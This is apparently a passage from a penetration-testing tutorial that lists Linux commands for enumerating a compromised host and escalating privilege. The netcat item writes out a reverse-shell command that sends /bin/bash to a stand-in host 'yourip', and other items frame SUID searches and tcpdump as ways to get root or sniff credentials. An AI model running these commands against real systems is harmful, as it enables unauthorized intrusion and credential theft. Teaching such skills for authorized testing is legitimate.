# 1: uname -a

What it does: Prints out system information.  
Why it’s useful: Once you gain entry into a system, you have to know what you’re handling. This command informs you about the kernel version, machine architecture, and operating system.

uname -a

Use case: Checking whether the system contains a vulnerable kernel version.

# 2: ifconfig or ip a

What it does: Displays network interface configurations.  
Why it’s useful: It informs you about the network configuration — IP addresses, interfaces, etc.

ip a

Tip: In contemporary systems, use ip a instead of ifconfig.

# 3: netstat -tulnp or ss -tulnp

What it does: Displays open ports and listening services.  
Why it’s helpful: Finding out about services on a machine as a pentester gives you insight into attack vectors that are possible.

ss -tulnp

Explanation:

- t — TCP sockets
- u — UDP sockets
- l — List sockets for listening
- n — Don’t look up names
- p — Display process by port number
# 6: sudo -l

What it does: Displays commands you can execute with sudo without a password.  
Why it’s useful: This command is pure gold when attempting privilege escalation.

sudo -l

Watch for: Inappropriately configured sudo privileges that enable you to execute hazardous commands such as vi, less, bash, or python as root.

# 7: find / -perm -4000 2>/dev/null

What it does: Locate SUID binaries (executables with special permissions).  
Why it’s useful: SUID binaries can be used to obtain root access.

find / -perm -4000 2>/dev/null

Pro tip: Compare the list with GTFOBins to identify privilege escalation vectors.

# 14: nc (Netcat)

What it does: A versatile networking tool.  
Why it’s useful: Can be used for file transfers, reverse shells, port scanning, and more.

# Create a reverse shell  
nc -e /bin/bash yourip 4444

Other uses: Great for setting up listeners and interacting with backdoors.

nc -lvnp 4444  # Listen for incoming connection

# 19: tcpdump

What it does: Captures network traffic.  
Why it’s useful: Helps sniff passwords, tokens, or other sensitive data from the wire (if you’re allowed to).

tcpdump -i eth0